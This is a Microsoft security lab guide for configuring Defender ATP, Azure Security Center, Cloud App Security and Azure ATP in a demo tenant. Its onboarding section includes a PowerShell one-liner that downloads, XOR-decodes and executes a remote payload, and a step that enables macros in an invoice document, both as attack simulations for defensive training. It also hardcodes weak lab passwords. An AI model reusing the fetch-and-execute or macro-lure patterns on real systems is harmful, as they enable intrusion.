# Lab Environment Configuration

There are a few prerequisites that need to be set up to complete all the sections in this lab.  This Exercise will walk you through the items below.

- [Link Windows Defender ATP Licenses](#link-windows-defender-atp-licenses)

- [Redeem Azure Pass](#redeem-azure-pass)

- [Azure AD User Configuration](#azure-ad-user-configuration)

- [Azure Security Center Setup](#azure-security-center-setup)
  
- [Windows Defender ATP Onboarding](#windows-defender-atp-onboarding)

- [Workplace Join Clients](#workplace-join-clients)

- [MCAS Environment Proparation](#mcas-environment-preparation)
  
- [Complete Azure Security Center Deployment](#complete-azure-security-center-deployment)

- [Azure Advanced Threat Protection Setup](#azure-advanced-threat-protection-setup)

===
# Link Windows Defender ATP Licenses
[:arrow_left: Home](#lab-environment-configuration)

In this task, we will link Windows Defender ATP licenses to your demo tenant.

1. [] Log into @lab.VirtualMachine(Client01).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++
2. [] Right-click on **Edge** in the taskbar and click on **New InPrivate window**.

3. [] In the InPrivate window, paste the provided Windows Defender Advanced Threat Protection Trial Sign up link.

1. [] Click **Sign in** in the upper right corner of the page and use the credentials below.
   
    ```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```  
	
2. [] On the Check out page, click **Try now**.

	!IMAGE[wlgzkp40.jpg](\Media\wlgzkp40.jpg)
1. [] On the Order Receipt page, click **Continue**.

1. [] Next, click on **Active Users >** or navigate to ```https://admin.microsoft.com/AdminPortal/Home#/users```.

	>[!NOTE] If necessary, log in using the credentials below:
	>
	>```@lab.CloudCredential(134).Username```
	>
	>```@lab.CloudCredential(134).Password```

1. [] Click on MOD Administrator, and in the details page, click **Edit** next to Product licenses.

	!IMAGE[fe5k7wwn.jpg](\Media\fe5k7wwn.jpg)
1. [] Toggle the **WD ATP** license to On and click **Save**.

	!IMAGE[6crecugz.jpg](\Media\6crecugz.jpg)

===
# Redeem Azure Pass
[:arrow_left: Home](#lab-environment-configuration)

For several of the exercises in this lab series, you will require an active subscription.  We are providing an Azure Pass for this purpose.  You will be provided with an Azure Pass code to use with the instructions below.

## Redeeming a Microsoft Azure Pass Promo Code:

1. [] Log into @lab.VirtualMachine(Client01).SelectLink using the password +++Pa$$w0rd+++
2. [] Right-click on **Edge** in the taskbar and click on **New InPrivate window**.

3. [] In the InPrivate window, navigate to ```https://www.microsoftazurepass.com```

4. [] Click the **Start** button to get started.

	!IMAGE[wdir7lb3.jpg](\Media\wdir7lb3.jpg)
1. [] Enter the credentials below and select **Sign In**.

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password``` 

	!IMAGE[gtg8pvp1.jpg](\Media\gtg8pvp1.jpg)
1. [] Click **Confirm** if the correct email address is listed.

	!IMAGE[teyx280d.jpg](\Media\teyx280d.jpg)

1. [] Paste the provided promo code in the Promo code box and click **Claim Promo Code**.

	> [!Knowledge] If pasting into box from your client system does not work natively, use the Type Text functionality of the lab environment 
	> !IMAGE[w7cijc7e.jpg](\Media\w7cijc7e.jpg)
	> !IMAGE[e1l35ko2.jpg](\Media\e1l35ko2.jpg)
	
	> [!NOTE] It may take up to 5 minutes to process the redemption.

8. [] Scroll to the bottom of the page and click **Next**.

  	!IMAGE[ihrjazqi.jpg](\Media\ihrjazqi.jpg)

  	> [!NOTE] You can keep the pre-populated information.

9. [] Check the box to agree to the terms and click **Sign up**.

  	!IMAGE[k2a97g8e.jpg](\Media\k2a97g8e.jpg)

  	> [!NOTE] It may take a few minutes to process the request.

1. [] While this is processing, you may continue to the next task.

===
# Azure AD User Configuration
[:arrow_left: Home](#lab-environment-configuration)

In this task, we will create new Azure AD users and assign licenses via PowerShell.  In a procduction evironment this would be done using Azure AD Connect or a similar tool to maintain a single source of authority, but for lab purposes we are doing it via script to reduce setup time.

1. [] Log into @lab.VirtualMachine(Scanner01).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++
2. [] Open a new Administrative PowerShell window and click below to type the code. 
   
    ```
    $cred = Get-Credential
    ```

1. [] When prompted, provide the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password``` 
   
1. [] In the PowerShell window, click on the code below to create users.

    ```
    # Store Tenant FQDN and Short name
    $tenantfqdn = "@lab.CloudCredential(134).TenantName"
    $tenant = $tenantfqdn.Split('.')[0]

    # Build Licensing SKUs
    $office = $tenant+":ENTERPRISEPREMIUM"
    $ems = $tenant+":EMSPREMIUM"

    # Connect to MSOLService for licensing Operations
    Connect-MSOLService -Credential $cred

    # Remove existing licenses to ensure enough licenses exist for our users
    $LicensedUsers = Get-MsolUser -All  | where {$_.isLicensed -eq $true}
    $LicensedUsers | foreach {Set-MsolUserLicense -UserPrincipalName $_.UserPrincipalName -RemoveLicenses $office, $ems}

    # Connect to Azure AD using stored credentials to create users
    Connect-AzureAD -Credential $cred

    # Import Users from local csv file
    $users = Import-csv C:\users.csv

    foreach ($user in $users){
    	
    # Store UPN created from csv and tenant
    $upn = $user.username+"@"+$tenantfqdn

    # Create password profile preventing automatic password change and storing password from csv
    $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile 
    $PasswordProfile.ForceChangePasswordNextLogin = $false 
    $PasswordProfile.Password = $user.password

    # Create new Azure AD user
    New-AzureADUser -AccountEnabled $True -DisplayName $user.displayname -PasswordProfile $PasswordProfile -MailNickName $user.username -UserPrincipalName $upn
    }
    
    # MCAS user and group creation
	$upn = "mcasAdminUS@"+$tenantfqdn
	New-AzureADUser -AccountEnabled $True -DisplayName "MCAS US admin" -PasswordProfile $PasswordProfile -MailNickName "mcasadminUS" -UserPrincipalName $upn
    New-AzureADGroup -DisplayName "US employees" -MailNickName "USemployees" -SecurityEnabled $true -MailEnabled $false
    $groupId = Get-AzureADGroup -SearchString "usemployees"
    $userId = Get-AzureADUser -SearchString "mcasadminus"
    Add-AzureADGroupMember -RefObjectId $userId.ObjectId -ObjectId $groupId.ObjectId
    

    ```

1. [] In the PowerShell window, click the code below to assign Office and EMS licenses.
	
	```
	Start-Sleep -s 10
	foreach ($user in $users){

    # Store UPN created from csv and tenant
    $upn = $user.username+"@"+$tenantfqdn

    # Assign Office and EMS licenses to users
    Set-MsolUser -UserPrincipalName $upn -UsageLocation US
    Set-MsolUserLicense -UserPrincipalName $upn -AddLicenses $office, $ems
    }

    # Assign Office and EMS licenses to Admin user
    $upn = "admin@"+$tenantfqdn
    Set-MsolUser -UserPrincipalName $upn -UsageLocation US
    Set-MsolUserLicense -UserPrincipalName $upn -AddLicenses $office, $ems

	```

===
# Azure Security Center Setup
[:arrow_left: Home](#lab-environment-configuration)

## VM and Workspace Deployment

This section is intended to deploy dependency Azure resources in an automated way to get you started quickly or in case you need to re-provision your environment.

***Additional notes**:*
- Close the Azure Advisor recommendations if that opens for you.
- When deploying the template below, a number of fields are locked to ensure that the references in the labs are accurate. You are free to choose your location for deployment

### Deploy VMs and Create a Workspace
Use the link below to deploy the following:
- A Log Analytics workspace (ASC-Workspace-xxxx)
- Security Center OMS solution
- 2 Windows VM's (*Win-x*, connected to the workspace)
- 2 Linux Ubuntu VM's (*Linux-x*, connected to the workspace) 

>[!NOTE] Because we are deploying the Security Center solution in the workspace, the VM's will become security managed by Security Center.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open a new tab and navigate to ```https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Ftianderturpijn%2FAzure-Security-Center%2Fmaster%2FLabs%2F01%2520-%2520VM%2520and%2520Workspace%2520Deployment%2FFiles%2FdeployAscManagedVmsWithLA.json```

	> [!KNOWLEDGE] If needed, log in using the credentials below:
	>
	>```@lab.CloudCredential(134).Username```
	>
	>```@lab.CloudCredential(134).Password```

1. [] On the Custom deployment page, next to **Resource group** click **Create new**.

	!IMAGE[NewRG.png](\Media\NewRG.png)
1. [] When prompted for a Name, provide a name such as ```ASC-Labs``` and press **OK**.

	^IMAGE[Open Screenshot](\Media\RGName.png)
1. [] Select a location, then under **Settings**, type the password ```Securitycenter4ever!```.
1. [] Finally, check the box to agree to the terms and click **Purchase**.

	^IMAGE[Open Screenshot](\Media\Password.png)

1. [] The deployment takes about 13 minutes. Continue to the next task and we will return to the ASC deployment later.

===
# Windows Defender ATP Onboarding
[:arrow_left: Home](#lab-environment-configuration)

In this task, we will perform initial setup of WD ATP and onboard 2 machines.

1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and log in with the password +++@lab.VirtualMachine(AdminPC).Password+++.

1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```

1. [] On Step 1, click **Next**.
1. [] On Step 2, choose a data storage location and click **Next**.
1. [] On Step 3, click **Next** several times until the Create your cloud instance dialog pops up, then click **Continue**.
1. [] On Step 4, click the **Download package** button and save the package to your desktop.
1. [] Extract the zip file to your desktop.
1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
1. [] In the Windows protected your PC dialog, click the **More info** link and click **Run anyway**.
1. [] In the UAC window, click on **More choices** and select use a different account.
1. [] Enter the credentials below and click **Yes**:

	```LabUser```

	```Pa$$w0rd```

1. [] Press **(Y)** to confirm onboarding.
2. [] Return to the browser and click **Start using Windows Defender ATP** (ignore any warnings about onboarding).
3. [] In the Windows Defender Security Center, click on **Settings > Advanced Features** and toggle the switches on for **Azure ATP integration**, **Office 365 Threat Intelligence Connection**, **Microsoft Cloud App Security**, and **Azure Information Protection** and press the **Save preferences** button at the bottom of the page.
	
	!IMAGE[g47p8c30.jpg](\Media\g47p8c30.jpg)

1. [] Switch to @lab.VirtualMachine(VictimPC).SelectLink and log in with the password +++@lab.VirtualMachine(VictimPC).Password+++.

1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. [] On the left, click the **Settings** icon.

	!IMAGE[settings.png](\Media\settings.png)

3. [] On the Settings page, under **Machine management**, click **Onboarding**.
   
	!IMAGE[Open Screenshot](\Media\onboarding.png)

1. [] Click **Download package** and **Open** when the download dialog pops up.
2. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
3. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
4. [] Press **(Y)** to confirm onboarding.
5. [] Run **Attack Simulation #1 "Automated investigation (fileless attack)"** by following the instructions below:
	1. [] Open a PowerShell window and click on the code below to type it in the window (please wait until you see **($decryptedBytes))** before pressing **Enter**):
	
	```
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
	```

1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and log in with the password +++@lab.VirtualMachine(AdminPC).Password+++.
1. [] Run **Attack Simulation #2 "Automated investigation (backdoor)"** by following the instructions below:
	1. [] On the desktop, double-click on **RS4_WinATP-Intro-Invoice.docm** and enter ```WDATP!diy#``` when prompted for a password.
	2. [] Once the file opens, in the **Security Warning** ribbon, click **Enable Content**.
	3. [] Click **OK** to confirm the attack.
	4. [] Press **Enter** to close the command prompt window.
===
# Workplace Join Clients
[:arrow_left: Home](#lab-environment-configuration)

In this task, we will join 3 systems to the Azure AD tenant to provide SSO capabilities in Office.

1. [] Log into @lab.VirtualMachine(Client01).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Right-click on the start menu and click **Run**.
1. [] In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	>!IMAGE[mssettings.png](\Media\mssettings.png)

1. [] In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```adams@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. [] Click **Done**.
1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. [] On the left, click the **Settings** icon.

	!IMAGE[settings.png](\Media\settings.png)

3. [] On the Settings page, under **Machine management**, click **Onboarding**.
   
	!IMAGE[Open Screenshot](\Media\onboarding.png)

1. [] Click **Download package** and **Open** when the download dialog pops up.
2. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
1. [] Press **(Y)** to confirm onboarding.
1. [] Log into @lab.VirtualMachine(Client02).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Right-click on the start menu and click **Run**.
1. [] In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	^IMAGE[Open Screenshot](\Media\mssettings.png)

1. [] In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```alicea@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. [] Click **Done**.
1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. [] On the left, click the **Settings** icon.

	^IMAGE[Open Screenshot](\Media\settings.png)

3. [] On the Settings page, under **Machine management**, click **Onboarding**.
   
	^IMAGE[Open Screenshot](\Media\onboarding.png)

1. [] Click **Download package** and **Open** when the download dialog pops up.
2. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
1. [] Press **(Y)** to confirm onboarding.
1. [] Log into @lab.VirtualMachine(Client03).SelectLink using the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Right-click on the start menu and click **Run**.
1. [] In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	^IMAGE[Open Screenshot](\Media\mssettings.png)

1. [] In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```evang@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. [] Click **Done**.
1. [] Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. [] Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. [] On the left, click the **Settings** icon.

	^IMAGE[Open Screenshot](\Media\settings.png)

3. [] On the Settings page, under **Machine management**, click **Onboarding**.
   
	^IMAGE[Open Screenshot](\Media\onboarding.png)

4. [] Click **Download package** and **Open** when the download dialog pops up.
5. [] Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
6. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
7. [] Press **(Y)** to confirm onboarding.
===
# MCAS Environment Preparation
[:arrow_left: Home](#lab-environment-configuration)

To be able to complete the different parts of the Cloud App Security labs, the following configuration steps are required.

* [Enabling Office 365 auditing](#enabling-office-365-auditing)
* [Connect Office 365 and BOX to Cloud App Security](#connect-office-365-to-cloud-app-security)
* [Enabling Azure Information Protection integration](#enabling-azure-information-protection-integration)

---

## Enabling Office 365 auditing

[:arrow_up: Top](#mcas-environment-preparation)

Most Cloud App Security treat detections capabilities rely on auditing being enabled in your environment. By default, auditing is not enabled in Office 365 and must then be turned on using the **Security & Compliance** admin console or PowerShell.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open a new InPrivate tab and navigate to ```https://protection.office.com```.	
	
	> [!KNOWLEDGE] If needed, log in using the credentials below:
	>
	>```@lab.CloudCredential(134).Username```
	>
	>```@lab.CloudCredential(134).Password```

4. [] In the **Security & Compliance Center**, Expand **Search & investigation** and click on **Audit log search**.
   
	^IMAGE[Audit log](\Media\conf-auditlog.png "Audit log")

5. [] You can see here that auditing is not enabled. Click on the **Turn on auditing** button to enable it and click **yes** at the prompt.

    ^IMAGE[Turn on auditing](\Media\conf-auditlog.png "Turn on on auditing")
    ^IMAGE[Auditing enabled](\Media\conf-auditenabled.png "Auditing enabled")

    >:warning: As this operation can take up to 24h, your instructor will provide you access to another environment to review the alerts for the threat detection lab.

:warning: In addition to enabling auditing in Office 365, some applications like Exchange Online require extra configuration. After enabling auditing at the Office 365 level, we have to enable auditing at the mailbox level. We will perform this configuration before going to the labs.

1. [] On Client01, open PowerShell.

    ^IMAGE[Open PowerShell](\Media\conf-powershell.png "Open PowerShell")

2. [] Enter the following commands to connect to Exchange Online using PowerShell. When prompted for credentials, enter your Office 365 administrative credentials.
   
	```

	$UserCredential = Get-Credential

    $Session = New-PSSession –ConfigurationName Microsoft.Exchange –ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $UserCredential –Authentication Basic -AllowRedirection

    Import-PSSession $Session
    
	```

    !IMAGE[Exchange PowerShell](\Media\conf-psonline.png "Exchange PowerShell")

3. [] Enter the following commands to enable auditing for your mailboxes. The second command let you verify that auditing is correctly enabled.
    ```
    Get-Mailbox -ResultSize Unlimited -Filter {RecipientTypeDetails -eq "UserMailbox"} | Set-Mailbox -AuditEnabled $true
    Get-Mailbox admin | fl audit*
    ```
    >:warning: When you create new mailboxes, auditing is not enabled by default. You will have to use the same commands again to enable auditing for those newly created mailboxes.

    !IMAGE[Mailbox auditing](\Media\conf-mbxauditing.png "Mailbox Auditing")

>:memo: **Reference:** [Enabling auditing for Exchange Online mailboxes](https://docs.microsoft.com/en-us/office365/securitycompliance/enable-mailbox-auditing?redirectSourcePath=%252fen-us%252farticle%252fenable-mailbox-auditing-in-office-365-aaca8987-5b62-458b-9882-c28476a66918)).

---

## Connect Office 365  and BOX to Cloud App Security 

[:arrow_up: Top](#mcas-environment-preparation)

To connect Cloud App Security to Office 365, you will have to use the Office 365 app connector. App connectors use the APIs of app providers to enable greater visibility and control by Microsoft Cloud App Security over the apps you connect to.

1. [] Open a new in Private tab in your browser and navigate to ```https://portal.cloudappsecurity.com```

2. [] Go to the gear icon and select **App connectors**.

    !IMAGE[App connector](\Media\conf-appconnector.png "App connector")

3. [] Click on the **+** button and select Office 365.

    !IMAGE[Add Office](\Media\conf-addoffice.png "Add Office")

4. [] Click on **Connect Office 365**. Cloud App Security will then have access to Office 365 activities and files.

    !IMAGE[Connect Office](\Media\conf-connectoffice.png "Connect Office")

5. [] Click on **Test now** to validate the configuration.

    !IMAGE[Test connectivity](\Media\conf-testoffice.png "Test connectivity")


 ## Connecting BOX to Cloud App Security**

 1. [] Go to the gear icon and select **App connectors**

 	!IMAGE[1](\Media\apibox1.JPG) "1") 

 2. []  Click on the **Plus** button and click on BOX.

	!IMAGE[2](\Media\apibox2.JPG)

 3. [] Type the name of your corporate instance and click **Connect Box.**

	!IMAGE[3](\Media\apibox3.JPG)

 4. []  Follow the **link** that shows up in the pop up.

	!IMAGE[4](\Media\apibox4.JPG)

5. [] Log into BOX with the same credentials used to create your developer account. 

	!IMAGE[5](\Media\apibox5.JPG)

6. [] Click on **Grant access to BOX**

	!IMAGE[6](\Media\apibox6.JPG)

7. [] Go back to the Cloud App Security portal and click on "Test Now" to see if the connection worked. 

	!IMAGE[7](\Media\apibox7.JPG)

	If the connection is succesful - it will say **Connected.** 

    !IMAGE[8](\Media\apibox8.JPG)

8. []  You should be able to see BOX as a connected app in the list. 

	!IMAGE[9](\Media\apibox9.JPG) 


---

## Enabling Azure Information Protection integration

[:arrow_up: Top](#mcas-environment-preparation)

To prepare the **Information Protection** lab, we have to enable the integration between Cloud App Security and Azure Information Protection as explained in the [Cloud App Security documentation](https://docs.microsoft.com/en-us/cloud-app-security/azip-integration). Enabling the integration between the two solutions is as easy as selecting one single checkbox.

1. [] Go to Cloud App Security settings.
    !IMAGE[Settings](\Media\conf-settings.png "Settings")

2. [] Go down in the settings to the **Azure Information Protection** section and check the **Automatically scan new files** checkbox and click on the "**Save** button.
    !IMAGE[Enable AIP](\Media\conf-aip.png "Enable AIP")

>:memo: It takes up to **1h** for Cloud App Security to sync the Azure Information classifications.

---



===
# Complete Azure Security Center Deployment
[:arrow_left: Home](#lab-environment-configuration)

Now that the template has been deployed, we can continue with the configuration of the Azure Security Center settings.

## Configure the data collection settings in ASC

Now that the workspace has been deployed (you don't have to wait for all the resources to be deployed), do the following:

1. [] Navigate to the **Security Center** blade.

	^IMAGE[Open Screenshot](\Media\SC.png)
2. [] In the Security Center - Getting started blade, scroll to the bottom of the window and click on **Start Trial**.

	^IMAGE[Open Screenshot](\Media\StartTrial.png)
3. [] In the next pane, click on **Install agents**.

	^IMAGE[Open Screenshot](\Media\InstallAgent.png)
4. [] In the left-hand pane, under POLICY & COMPLIANCE, click on **Security policy**.

	!IMAGE[SecPol](\Media\SecPol.png)
1. [] On the line where it lists your **workspace**, click on **Edit settings**.
10. [] In the left pane, click on **Pricing tier**, select **Standard** and click on **Save**.

	^IMAGE[Open Screenshot](\Media\Pricing.png)
13. [] Click on Data collection and select **All Events** and click on **Save**. 

	^IMAGE[Open Screenshot](\Media\DC.png)
10. [] Switch back to **Security Policy** and click **OK** to dismiss the message **Your unsaved edits will be discarded**.

	!IMAGE[SecPol](\Media\SC2.png)
6. [] On the line where it lists your Azure subscription (Azure pass), click on **Edit settings**.

	^IMAGE[Open Screenshot](\Media\EditSettings.png)
7. [] Verify that **Auto Provisioning** is set to **On**.
8. [] Under Workspace configuration, select **Use another workspace** and select your workspace **ASC-Workspace-xxxx** (which has been created by the template).

	^IMAGE[Open Screenshot](\Media\Workspace.png)
1. [] Under Windoews secuity events, select **All events**.
9. [] Click on **Save** at the top of the page.
9. [] Click on **Yes** on **Would you like to reconfigure monitored VMs?**.
10. [] Click on **Pricing tier** on the left and click **OK** to ignore the dialog.
11. [] Under Settings - Pricing tier, click **Standard** and click **Save**.

>[!HINT] It can take some time for the VMs to become visible in Security Center

===
# Azure Advanced Threat Protection Setup
[:arrow_left: Home](#lab-environment-configuration)

## Create and configure Azure ATP Workspace 

1. []	Login into @lab.VirtualMachine(ContosoDC).SelectLink using the password	+++@lab.VirtualMachine(ContosoDC).Password+++ 

2. []	Open Internet Explorer and browse to ```https://portal.atp.azure.com``` and login with the following credentials.  
   
   ```@lab.CloudCredential(134).UserName``` 

   ```@lab.CloudCredential(134).Password``` 
   
6. []	Click **Create**. 
8. []	Click **Provide a username and password to connect to your Active Directory forest**.  
9. []	On the Directory Services page enter the following and click **Save**: 

|||
|-----|-----|
|Username|```aatpservice```|
|Password|```Password123!@#```|
|Domain|```contoso.azure```|

---
## Deploy the Azure ATP Sensor  

1. []	Click the **Download Sensor Setup** link. 
1. []   Click  **Download** to download the Sensor installer package. 
1. []   Copy the **Access key**, this will be needed during the installation of the Sensor. 
1. []   Extract the installation files from the Zip file and run **Azure ATP sensor setup.exe**. 

	>[!NOTE] Do not run the installer from within the Zip file, you need to extract the files before running the installer.

1.	Click **Run** in the Open File Security Warning page. 
1.	Select the installation language of choice and click **Next**. 
1.	Click **Next** on the Sensor deployment type page.  
1.	**Paste the Access key** copied from above and click **Install**.  

## Configure Domain Synchronizer 
1.	In the Azure ATP console **click on the deployed Sensor** and **toggle the Domain synchronizer candidate switch** to **On** and click **Save**. 

## Configure Windows Defender ATP Integration 
1. In the Azure ATP console click **Windows Dender ATP** and then toggle the **Integration with Widnows Defender ATP** to **On** and click **Save**

	>[!NOTE] This requires that you have already enabled the Windows Defender ATP service. 

=== 
## Adding Guest User access to Azure ATP Console.
[:arrow_left: Home](#lab-environment-configuration)  

To allow users not in the companies Azure Active Directory to access the Azure ATP console you configure a guest user and then add them to the proper Azure ATP AAD group.  

1. [] On ContosoDC, open a new tab in IE and browse to ```https://portal.azure.com```. You should be automatically logged in. If not, login with the following credentials.  
   
   ```@lab.CloudCredential(134).UserName``` 

   ```@lab.CloudCredential(134).Password``` 

2. []	Close any popup windows that might have opened.  
3. []	Click **Azure Active Directory**. 
4. []	Click **Users**. 
5. []	Click **New guest user**. 
6. []	Enter email address for guest user such as ```@lab.User.Email``` and click **Invite**. 
7. []	Close the Users blade by clicking the **X** in the right-hand side.  
8. []	Click **Groups**. 
9. []	Click **Azure ATP {workspace name} Administrators group** (the first Azure ATP Group).  
10. []	Click **Members**. 
11. []	Click **Add members**. 
12. []	Select the **guest user added above** and click **Select**. 

> [!NOTE]	After the user accepts the invitation the user will be able to access the Azure ATP console for this workspace using their email account.  
